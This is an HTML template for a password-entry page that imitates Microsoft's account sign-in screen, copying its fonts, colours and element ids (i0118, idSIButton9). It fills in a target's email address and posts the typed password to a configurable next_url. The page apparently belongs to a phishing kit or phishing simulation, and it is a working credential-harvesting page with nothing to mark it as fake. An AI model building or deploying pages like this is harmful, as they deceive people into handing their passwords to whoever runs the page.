<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Enter password</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', SegoeUI, 'Helvetica Neue', Arial, sans-serif;
            background: #f3f2f1;
        }
        .outer-container {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f3f2f1;
        }
        .card {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.13);
            width: 100%;
            max-width: 400px;
            padding: 44px 48px 36px 48px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: stretch;
        }
        .title {
            font-size: 24px;
            font-weight: 400;
            color: #1b1b1b;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 24px;
            word-break: break-all;
        }
        .input-label {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 8px;
            font-weight: 400;
        }
        .input {
            width: 100%;
            padding: 10px 12px;
            font-size: 15px;
            border: 1px solid #8a8886;
            border-radius: 0;
            margin-bottom: 24px;
            outline: none;
            background: #fff;
            color: #1b1b1b;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }
        .input:focus {
            border-color: #0067b8;
        }
        .btn {
            width: 100%;
            background: #0067b8;
            color: #fff;
            border: none;
            border-radius: 0;
            padding: 10px 0;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 16px;
            transition: background 0.2s;
        }
        .btn:focus, .btn:hover {
            background: #005ba1;
        }
        .links {
            display: flex;
            justify-content: flex-start;
            margin-top: 8px;
        }
        .link {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
            transition: text-decoration 0.2s;
        }
        .link:focus, .link:hover {
            text-decoration: underline;
        }
        @media (max-width: 480px) {
            .card {
                padding: 32px 8vw 24px 8vw;
                max-width: 100vw;
            }
        }
    </style>
</head>
<body>
    <div class="outer-container">
        <main role="main" aria-label="Password entry form" class="card">
            <div class="title">Enter password</div>
            <div class="subtitle">{{ email }}</div>
            <form method="post" action="{{ next_url }}" autocomplete="off">
                <input type="hidden" name="email" value="{{ email }}">
                <label for="i0118" class="input-label">Password</label>
                <input id="i0118" class="input" type="password" name="passwd" required autocomplete="current-password" aria-label="Enter your password">
                <button class="btn" type="submit" id="idSIButton9">Sign in</button>
            </form>
            <div class="links">
                <a class="link" href="#">Forgot password?</a>
            </div>
        </main>
    </div>
</body>
</html>
